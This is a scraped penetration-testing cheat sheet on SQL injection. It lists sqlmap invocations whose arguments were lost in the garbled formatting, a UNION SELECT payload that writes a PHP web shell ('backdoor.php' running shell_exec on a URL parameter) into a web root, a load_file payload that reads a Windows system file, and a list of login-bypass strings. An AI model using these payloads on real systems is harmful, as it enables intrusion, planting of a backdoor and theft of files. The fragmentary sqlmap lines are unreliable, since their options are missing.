# **SQL Injection (SQL MAP)**

**

## SQL Injection

**  
  
**

### # sqlmap crawl

**

###   
sqlmap -u

[http://](http://10.10.10.10/)

### x.x.x.x  
  

**

### # sqlmap dump database

**

###   
sqlmap -u

[http://](http://10.10.10.10/)

### x.x.x.x  
  

**

### # sqlmap shell

**

###   
sqlmap -u

[http://](http://10.10.10.10/)

### x.x.x.x  
  
sqlmap --url

[http://](http://10.0.0.28:1337/978345210/index.php)

### x.x.x.x  
  
sqlmap --url

[http://](http://192.168.153.144:1337/978345210/index.php)

### x.x.x.x  
  

**

### Upload php command injection file

**

###   
  
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'  
  

**

### Load file

**

###   
  
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6  
  

**

### Bypasses

**

###   
  
' or 1=1 LIMIT 1 --  
' or 1=1 LIMIT 1 -- -  
' or 1=1 LIMIT 1#  
'or 1#  
' or 1=1 --  
' or 1=1 -- -